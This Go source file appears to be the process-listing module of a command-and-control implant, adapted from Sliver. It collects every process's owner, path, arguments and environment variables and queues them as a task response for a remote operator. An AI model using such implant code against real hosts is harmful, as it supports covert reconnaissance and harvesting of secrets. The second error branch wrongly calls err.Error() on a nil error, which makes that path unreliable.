package ps

import (
	"encoding/json"

	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

// Taken directly from Sliver's PS command. License file included in the folder

//Process - platform agnostic Process interface
type Process interface {
	// Pid is the process ID for this process.
	Pid() int

	// PPid is the parent process ID for this process.
	PPid() int

	// Arch is the x64 or x86
	Arch() string

	// Executable name running this process. This is not a path to the
	// executable.
	Executable() string

	// Owner is the account name of the process owner.
	Owner() string

	// bin_path of the running process
	BinPath() string

	// arguments
	ProcessArguments() []string

	//environment
	ProcessEnvironment() map[string]interface{}

	SandboxPath() string

	ScriptingProperties() map[string]interface{}

	Name() string

	BundleID() string
}

//ProcessArray - struct that will hold all of the Process results
type ProcessArray struct {
	Results []ProcessDetails `json:"Processes"`
}

type ProcessDetails struct {
	ProcessID           int                    `json:"process_id"`
	ParentProcessID     int                    `json:"parent_process_id"`
	Arch                string                 `json:"architecture"`
	User                string                 `json:"user"`
	BinPath             string                 `json:"bin_path"`
	Arguments           []string               `json:"args"`
	Environment         map[string]interface{} `json:"env"`
	SandboxPath         string                 `json:"sandboxpath"`
	ScriptingProperties map[string]interface{} `json:"scripting_properties"`
	Name                string                 `json:"name"`
	BundleID            string                 `json:"bundleid"`
}

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	procs, err := Processes()
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	p := make([]ProcessDetails, len(procs))

	// Loop over the process results and add them to the json object array
	for index := 0; index < len(procs); index++ {
		p[index].Arch = procs[index].Arch()
		p[index].ProcessID = procs[index].Pid()
		p[index].ParentProcessID = procs[index].PPid()
		p[index].User = procs[index].Owner()
		//p[index].Path = procs[index].Executable()
		p[index].BinPath = procs[index].BinPath()
		p[index].Arguments = procs[index].ProcessArguments()
		p[index].Environment = procs[index].ProcessEnvironment()
		p[index].SandboxPath = procs[index].SandboxPath()
		p[index].ScriptingProperties = procs[index].ScriptingProperties()
		p[index].Name = procs[index].Name()
		p[index].BundleID = procs[index].BundleID()
	}

	var pa ProcessArray
	pa.Results = p
	jsonProcs, er := json.MarshalIndent(p, "", "	")

	if er != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	msg.Completed = true
	msg.UserOutput = string(jsonProcs)
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
